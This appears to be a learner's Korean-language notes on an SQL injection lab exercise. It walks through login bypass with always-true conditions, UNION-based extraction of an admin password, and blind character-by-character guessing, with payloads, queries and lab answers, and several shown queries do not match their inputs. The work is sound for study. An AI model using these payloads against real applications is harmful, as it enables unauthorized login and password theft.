@@ -1,0 +1,224 @@
+실습 :
+    SQL Injection Tutorial 2
+    
+목표0: SQL Injection을 통해 로그인을 우회하세요.
+
+    User ID:
+        admin
+    User PW:
+        ${upw}
+
+    Query:
+        select * from users where uid="admin" and upw="${upw}"
+
+    Result :
+        False
+
+    답 : 1" or "1
+
+    Query:
+        select * from users where uid="admin" and upw="1" or "1"
+
+    Result :
+        True
+
+    조건을 참으로 만들어 SQL결과에 데이터가 포함되도록 합니다.
+    upw=1" OR 1-- 
+
+    주입된 내용은 ‘ OR 1=1 -- 로  WHERE 절에 있는 싱글쿼터를 닫아주기 위한 싱글쿼터와 OR 1=1 라는 구문을 이용해 
+    WHERE 절을 모두 참으로 만들고, -- 를 넣어줌으로 뒤의 구문을 모두 주석 처리 해주었습니다.
+
+목표1: SQL Injection을 통해 Admin의 Full Password를 찾아 Find Admin Password에 입력하세요.
+
+    SQL Query의 결과가 맨 앞 한 글자만 출력됩니다.
+    Result = run_query()['upw'][0]
+
+
+    User ID:
+        admin
+    User PW:
+        ${upw}
+    Find Admin PW:
+        Input Admin Password
+
+    Query:
+        select * from users where uid="admin" and upw="${upw}";
+
+    답 :
+    User ID:
+        admin
+    User PW:
+        " union select upw from users where uid="admin
+    Find Admin PW:
+        Input Admin Password
+
+    Query:
+        select upw from users where uid="admin" and upw="" union select upw from users where uid="admin"
+
+    Result :
+        p // SQL Query 결과가 맨 앞 한글자만 출력되므로 하나만 알수있었다.
+
+    답 :
+    User PW:
+        " union select substr(upw, 2, 1) from users where uid="admin
+
+    Query:
+        select upw from users where uid="admin" and upw="" union select substr(upw, 2, 1) from users where uid="admin"
+
+    Result :
+        w // substr을 사용해서 2번째 index부터 길이 1만큼 가져온다 어차피 값 1개만 return하기 떄문에 길이는 상관없다.
+
+    값이 더이상 안나올때까지 한다
+
+    답 :
+        Find Admin PW:
+            pw2020
+
+목표2: Find Admin Password에 입력을 바꿔가면서 Admin Password를 찾으세요.
+    * 이전 Password와 다름
+    hint: pw???? (?는 0~9 사이 숫자)
+
+    Find Admin PW:
+        Input Admin Password
+
+    Query:
+        select * from users where uid="admin" and upw="${upw}";
+
+    Result :
+
+    답 :
+        Find Admin PW:
+            pw
+
+        Query:
+            select * from users where uid="admin" and upw="${upw}";
+
+        Result :
+            6자리 비밀번호 중 2만큼 맞췄습니다
+
+    답 :
+    Find Admin PW:
+        pw8
+
+    Query:
+        select * from users where uid="admin" and upw="${upw}";
+
+    Result :
+        admin 비밀번호가 틀렸습니다.
+
+    답 :
+    Find Admin PW:
+        pw9
+
+    Query:
+        select * from users where uid="admin" and upw="${upw}";
+
+    Result :
+        6자리 비밀번호 중 3만큼 맞췄습니다
+
+    // 이런식으로 하나씩 값을 넣어서 답을 알아낸다 Blind sql injection하는 것
+
+    답 :
+    Find Admin PW:
+        pw9531
+
+    Query:
+        select * from users where uid="admin" and upw="${upw}";
+
+    Result :
+        6자리 비밀번호 중 6만큼 맞췄습니다
+
+    Find Admin PW 입력칸에 pw+[0-9] 값을 입력하며 결과를 통해 값의 결과를 확인할 수 있습니다.
+    "6자리 비밀번호 중 n만큼 맞췄습니다"라는 문구가 출력되면 입력된 pw 만큼은 맞았다는 것을 알 수 있습니다.
+
+목표3: Blind SQL Injection을 통해 Admin의 Full Password를 찾아 Find Admin Password에 입력하세요.
+    * 이전 Password와 다름
+    hint: pw???? (?는 0~9 사이 숫자)
+    결과가 있으면 "로그인 성공" / 결과가 없으면 "로그인 실패"
+
+    User ID:
+        admin
+    User PW:
+        ${pwd}
+    Find Admin PW:
+        Input Admin Password
+
+    Query:
+        select * from users where uid="admin" and upw=""
+
+    Result :
+    
+    답 :
+    User ID:
+        admin
+    User PW:
+        " union select * from users --
+    Find Admin PW:
+        Input Admin Password
+
+    Query:
+        select * from users where uid="admin" and upw="" union select * from users --"
+
+    Result :
+    로그인 성공 // 아무 값이나 Query에 성공하면 로그인 성공이란 text를 return한다
+
+    답 :
+    User PW:
+        " or "1 // 한글자 비교해서 true면 Query에 성공하므로 로그인 성공 메시지 확인
+
+    Query:
+        select * from users where uid="admin" and upw="" or "1"
+
+    Result :
+        로그인 성공
+
+    답 :
+    User PW:
+        " or substring(upw,1,1)="p // 한글자 비교해서 true면 Query에 성공하므로 로그인 성공 메시지 확인
+
+    Query:
+        select * from users where uid="admin" and upw="" or substring(upw,1,1)="p"
+
+    Result :
+        로그인 성공
+
+    // 이걸 이용해서 값을 하나씩 찾는다
+
+    답 :
+    User PW:
+        " or substring(upw,6,1)="
+
+    Query:
+        select * from users where uid="admin" and upw="" or substring(upw,1,1)=""
+
+    Result :
+        로그인 성공 // 값이 공백인데 로그인 성공을 return 받았다 = 패스워드가 끝나서 공백이다.
+
+    답 :
+    User PW:
+        " or substring(upw,6,1)="8 // 한글자 비교해서 true면 Query에 성공하므로 로그인 성공 메시지 확인
+
+    Find Admin PW:
+        pw3018
+
+    Query:
+        select * from users where uid="admin" and upw="" or substring(upw,1,1)="p"
+
+    Result :
+        로그인 성공
+
+    // Find Admin PW에 password 값을 찾을 떄마다 넣어서 로그인 성공할때 까지 반복
+
+    한 글자씩 비교해가며 로그인 성공 여부를 통해 결과를 확인할 수 있습니다.
+    upw=" or uid="admin" and substr(upw,1,1)="p
+    upw=" or uid="admin" and substr(upw,2,1)="w
+    ...
+    upw=" or uid="admin" and substr(upw,6,1)="8
+
+
+
+
+
+
+
+
